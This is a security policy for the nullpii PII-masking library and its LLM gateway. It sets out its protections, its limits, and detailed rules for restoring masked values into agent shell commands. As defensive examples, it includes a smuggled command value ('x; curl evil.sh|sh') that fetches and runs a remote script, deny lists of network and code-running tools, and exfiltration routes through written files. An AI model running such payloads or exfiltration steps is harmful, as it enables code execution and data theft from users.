# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, and every file it downloads is checked against a SHA-256 pinned in the library; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything (the check and the request are two connections, so a process that swaps in between them is not excluded), but a process of your own user can read the gateway's memory, and anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers every tool a shell runs, under each agent's name: `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex).

**A value comes back only into a command whose every program is on a short list of programs that read their arguments as data:** `ls`, `cat`, `head`, `tail`, `wc`, `grep`, `egrep`, `fgrep`, `rg`, `find`, `stat`, `file`, `du`, `df`, `diff`, `cmp`, `sort`, `cut`, `tr`, `jq`, `echo`, `printf`, `mkdir`, `cd`, `pwd`, `touch`, `basename`, `dirname`, `realpath`, `readlink`, `sha256sum`, `sha1sum`, `md5sum`, `shasum`, `base64`, `column`, `nl`, `true`, `false`, `test`, `[`, `:`, and `git` `log`, `status`, `diff`, `show`, `add`, `commit`, `blame`, `grep`, `ls-files`, `rev-parse`; each by name, with no wrapper (`sudo`, `env`, …), not by path, with no redirection before it (`>| cat …`), with no computed argument (`$x`, `$'…'`; `git commit` aside, whose options name no program or output file), and for `git` with the subcommand right after `git` (no global options such as `-C` or `--no-pager`). Any other program keeps every placeholder in the whole command: no list can name every program that sends data out, runs code it is handed or writes where an argument says, so the default is to restore nothing. Programs that overwrite or delete where an argument points (`cp`, `mv`, `rm`, `tee`, `install`) are not on the list, and neither are options of listed programs that run or write (`find -exec`/`-delete`/`-fprint`, `rg --pre`/`--hostname-bin`, `sort -o`, `base64 -o`, `printf -v`, `file -C`, `git --output`, `git grep -O`, and every abbreviation that getopt_long or git accepts, down to one letter, such as `sort --o`; ripgrep accepts none): a command that uses one keeps every placeholder. A `cd` argument never gets a value: it chooses the directory every later command runs in, also in the next call when the shell is kept across calls, and git reads its configuration and hooks there.

On top of that list, as a second line, these keep every placeholder even with listed programs:

- **sending data out:** a network client, an upload, a fetch or an install, `/dev/tcp`, a URL handed to any program but `cat`, `echo`, `printf`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true`, `:` or `git commit`/`add`/`status`/`diff`/`log`/`show`, anywhere in the text;
- **running code:** an interpreter or program that evaluates code (`bash -c`, `python3`, `eval`, `xargs`, …), an option that runs a command (`find -exec`, `rg --pre`, `sort --compress-program`, `git -c`, …), a command that sets what later commands run (`git config`, `crontab`, …), or that writes into a file that runs later (`.git/hooks/`, `.husky/`, a shell start-up file, `.envrc`, `/etc/`, a `bin/` directory);
- **`sed`, `perl`, `ruby`:** their code can be ended by any character and run what follows.

These checks skip the body of a heredoc written out as data, so a commit message that mentions `ssh` is not a network call; a body that expands is still read for its substitutions. They run twice: on the command as the model wrote it, and on the command with the values put back.

Otherwise **a value comes back only as one plain word:** letters, digits and `@%+:,./_=-`, not starting with `-` (an option), `=` (zsh's `=cmd`) or `~` (a home directory). Such a word cannot end the quoting it stands in or start another command. And **never where it would choose what runs, what is written, or what later commands see:** a placeholder that is, or is part of, the program a simple command runs (after an assignment or an operator, in a substitution or a `case` branch, or named by a path such as `./{{…}}`), a redirection target (`> {{…}}`), an assignment (`PAGER={{…}}`), or an argument of `export`, `alias`, `declare` and the like stays masked.

| Position | What the value may contain |
|---|---|
| Any position in a command that runs a program off the list, sends data out or runs code (above), writes through an output redirection in any form (`>`, `>>`, `>|`, `>!`, `&>`, `&>>`, `>&FILE`, `<>`) to a file that is not a document, or is longer than 64 words or 4 KiB in one simple command | Nothing: every placeholder stays masked |
| The program of a simple command, or part of it; a redirection target; an assignment; an argument of `export`, `alias`, … | Nothing: it stays masked |
| Anywhere else in shell code, quoted or not | One plain word |
| Heredoc body that `cat` writes out, in a command that runs only `cat`, `echo`, `printf`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true`, `:` or `git` `commit`, `add`, `status`, `diff`, `log`, `show`, each by name, with its quoting and substitutions closed, and written to standard output or to a document file (`.md`, `.markdown`, `.txt`, `.csv`, `.tsv`, `.log`, `.rst`) with no hidden directory or file on its path, and not a build input such as `CMakeLists.txt` or `requirements.txt` | Literal body (`<<'EOF'`): no line break. Bare delimiter (`<<EOF`): no line break, `$`, backtick or backslash |
| A heredoc body written to any other file (`.git/config`, `Makefile`, `run.sh`, `CMakeLists.txt`, `requirements.txt`, …), expanding or not | Nothing: every placeholder in the command stays masked |
| Any other heredoc body | One plain word, or nothing in a command above |
| A `#` comment | Its quotes and heredoc markers are ignored, so they cannot change the position of what follows |

So an email or a single-word name comes back in a command such as `grep`, `ls` or `git log`; a name like `Mary Ann` or `D'Amico` comes back only in a heredoc body written out as data, such as Claude Code's usual commit form `git commit -m "$(cat <<'EOF' … EOF)"`; and any command with a program off the list (`npm test`, `python3 x.py`, `make`, `curl`, `cp`) gets no values at all, even after a `cd`.

A `command` sent as an argv array (`["bash", "-lc", "…"]`, as Codex does) follows the same rules: never the program, nothing in a program off the list, and the script a shell runs with `-c` (past options such as `-o pipefail`) is judged as a string command.

The command is read once, in time linear in its length; one longer than 256 KiB, nested more than 64 levels deep, or whose reading would take more than twice its length plus 32 KiB of word scanning, keeps every placeholder; so does one with a simple command longer than 64 words or 4 KiB, whose later words the rule does not read. The list of programs that get values back is closed: a program it does not name gets nothing. The lists of network clients and code runners are a second line within it.

**A limit by design: each call is judged on its own.** `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A value restored by one call can therefore leave through a later call that holds no placeholder: a file written by `Write` or a shell redirect and then sent (`curl -d @notes.txt …`), a commit followed by `git push`, a variable set in a shell that Anthropic's bash tool keeps across calls. A later command can also run such a file (`bash run.sh` after `Write run.sh`). The rule does not follow what a file, a commit or a shell holds.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`); development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
